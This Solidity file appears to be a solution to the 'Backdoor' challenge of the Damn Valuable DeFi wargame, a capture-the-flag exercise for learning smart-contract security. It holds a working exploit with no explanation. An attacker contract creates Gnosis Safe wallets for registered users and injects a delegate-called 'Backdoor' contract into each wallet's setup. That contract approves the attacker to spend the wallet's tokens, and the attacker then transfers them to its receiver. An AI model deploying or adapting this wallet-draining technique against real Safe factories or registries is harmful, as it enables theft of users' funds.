// SPDX-License-Identifier: MIT
pragma solidity =0.8.19;


import {Enum} from "@safe/contracts/common/Enum.sol";
import {GnosisSafeProxyFactory} from "@safe/contracts/proxies/GnosisSafeProxyFactory.sol";
import {IProxyCreationCallback, GnosisSafeProxy} from "@safe/contracts/proxies/IProxyCreationCallback.sol";
import {DamnValuableToken} from "@main/DamnValuableToken.sol";


contract BackdoorAttacker {
    address public receiver;
    address public token;
    address public masterCopy;
    address public factory;
    address public walletRegistry;
   

    constructor(
        address _receiver,
        address _token,
        address _masterCopy,
        address _factory,
        address _walletRegistry,
        address[] memory users
    ) {
        receiver = _receiver;
        token = _token;
        masterCopy = _masterCopy;
        factory = _factory;
        walletRegistry = _walletRegistry;
       
        Backdoor backdoor = new Backdoor();

        bytes memory setupData = abi.encodeWithSignature(
            "approve(address,address,uint256)",
            address(this),
            address(token),
            10 ether
        );


        for (uint256 i = 0; i < users.length; i++) {
            address user = users[i];
            address[] memory target = new address[](1);
            target[0] = user;

            bytes memory gnosisSetupData = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                target,             // wallet owners
                uint256(1),         // threshold
                address(backdoor),  // to (Contract address for optional delegate call.)
                setupData,          // data   
                address(0),         // fallbackHandler
                address(0),         // Token that should be used for the payment (0 is ETH)
                uint256(0),         // payment (Value that should be paid)
                address(0)          // paymentReceiver ( Adddress that should receive the payment (or 0 if tx.origin))
            );

            GnosisSafeProxy proxy = GnosisSafeProxyFactory(factory)
                .createProxyWithCallback(
                    masterCopy,
                    gnosisSetupData,
                    123,
                    IProxyCreationCallback(walletRegistry)
                );

            DamnValuableToken(token).transferFrom(
                address(proxy),
                receiver,
                10 ether
            );
        }
    }
}


// delegate called 
contract Backdoor {
    function approve(
        address approvalAddress,
        address token,
        uint256 amount
    ) public {
        DamnValuableToken(token).approve(approvalAddress, amount);
    }
}